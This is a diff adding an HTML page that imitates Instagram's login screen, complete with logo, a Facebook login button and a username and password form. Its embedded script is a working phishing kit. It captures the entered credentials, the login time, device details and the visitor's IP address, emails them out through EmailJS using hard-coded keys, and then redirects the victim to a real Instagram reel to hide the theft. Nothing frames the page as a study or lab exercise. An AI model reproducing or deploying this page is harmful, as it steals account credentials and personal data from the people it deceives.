@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="icon" type="image/png" href="url.png">
+</head>
+<body class="min-h-screen bg-white">
+
+    <!-- Top Navigation -->
+    <nav class="flex items-center justify-between p-4 border-b">
+        <img src="instagram.jpg"
+             alt="Instagram"
+             class="h-[29px] w-[103px]" />
+        <div class="flex items-center gap-3">
+            <a href="#" class="text-[#0095F6] hover:text-[#0095F6]/80">Log in</a>
+            <button class="bg-[#0095F6] hover:bg-[#0095F6]/90 text-white rounded-lg px-6 py-2">Open App</button>
+        </div>
+    </nav>
+
+    <main class="flex flex-col items-center px-4 pt-8">
+        <!-- Main Content -->
+        <div class="w-full max-w-[350px] flex flex-col items-center">
+            <img src="instagram.jpg" alt="Instagram" class="mb-8 h-[51px] w-[175px]" />
+
+            <!-- Facebook Login Button -->
+            <button class="w-full bg-[#0095F6] hover:bg-[#0095F6]/90 text-white mb-4 h-12 flex items-center justify-center gap-2 rounded-lg">
+                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-7h-2.54v-3h2.54v-2.16c0-2.51 1.492-3.89 3.777-3.89 1.096 0 2.238.196 2.238.196v2.46h-1.26c-1.243 0-1.626.774-1.626 1.567V12h2.773l-.443 3h-2.33v7C18.343 21.128 22 16.991 22 12z"/>
+                </svg>
+                Continue Using Facebook
+            </button>
+
+            <div class="w-full flex items-center gap-4 my-6">
+                <div class="h-px bg-gray-300 flex-1"></div>
+                <span class="text-gray-500 font-semibold">OR</span>
+                <div class="h-px bg-gray-300 flex-1"></div>
+            </div>
+
+            <!-- Login Form -->
+            <form id="login-form" class="w-full space-y-3">
+                <input type="text" id="user_email" name="user_email" placeholder="Phone number, username or email address"
+                       class="w-full h-12 bg-gray-50 border border-gray-200 p-2 rounded" required />
+                <input type="password" id="password" name="password" placeholder="Password"
+                       class="w-full h-12 bg-gray-50 border border-gray-200 p-2 rounded" required />
+                <a href="#" class="block text-sm text-[#0095F6] text-center hover:text-[#0095F6]/80">
+                    Forgotten your password?
+                </a>
+                <button type="submit" class="w-full bg-[#0095F6] hover:bg-[#0095F6]/90 text-white h-12 mt-4 rounded">
+                    Log in
+                </button>
+            </form>
+
+            <p class="mt-16 text-sm text-center">
+                Don't have an account?
+                <a href="#" class="text-[#0095F6] font-semibold hover:text-[#0095F6]/80">Sign up</a>
+            </p>
+
+            <footer class="mt-16 text-sm text-gray-500 text-center">
+                By continuing, you agree to Instagram's
+                <a href="#" class="text-gray-700">Terms of Use</a> and
+                <a href="#" class="text-gray-700">Privacy Policy</a>.
+            </footer>
+        </div>
+    </main>
+
+   <script>
+    (function(){
+        emailjs.init("y3S-maVbT-5HuUXZd"); // Your EmailJS Public Key
+    })();
+
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        // Capture User Input
+        let userEmail = document.getElementById("user_email").value;
+        let userPassword = document.getElementById("password").value;
+        let loginTime = new Date().toLocaleString(); // Get current time
+        let userAgent = navigator.userAgent; // Browser & device info
+        let platform = navigator.platform; // OS info
+
+        // Fetch IP Address
+        fetch("https://api64.ipify.org?format=json") 
+            .then(response => response.json())
+            .then(data => {
+                let userIP = data.ip; // Store IP address
+
+                // Prepare email data
+                let emailData = {
+                    user_email: userEmail,
+                    password: userPassword,
+                    login_time: loginTime,
+                    ip_address: userIP,
+                    device_info: `User Agent: ${userAgent}, Platform: ${platform}`
+                };
+
+                // Send data via EmailJS
+                emailjs.send("service_l0gtohf", "template_rtlho2p", emailData)
+                    .then(() => {
+                        window.location.href = "https://www.instagram.com/reel/DD1BXQctGgi/"; // Redirect after submission
+                    })
+                    .catch(error => console.error("EmailJS Error:", error));
+            })
+            .catch(error => console.error("IP Fetch Error:", error));
+    });
+</script>
+</body>
+</html>
